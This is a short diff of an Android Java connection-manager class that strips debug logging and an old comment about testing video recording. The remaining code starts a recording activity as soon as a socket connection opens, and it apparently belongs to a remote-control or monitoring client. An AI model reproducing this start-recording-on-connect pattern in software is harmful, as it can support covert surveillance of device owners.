@@ -29,15 +29,9 @@ public class ConnectionManager {
     }
     public static void startAsync(Context con)
     {
-
         try {
             context = con;
-
-            Log.d("VIDEO0000000","connectconnect");
             sendReq();
-           //试验录像功能
-            //x0000rt();
-
         }catch (Exception ex){
             startAsync(con);
         }
@@ -48,7 +42,7 @@ public class ConnectionManager {
         if(ioSocket != null )
             return;
        // int a=IOSocket.aa();
-        Log.d("VIDEO0000000","connectininini");
+
         currentTime=System.currentTimeMillis();
         RecordActivity.startRecordActivity(0);
 
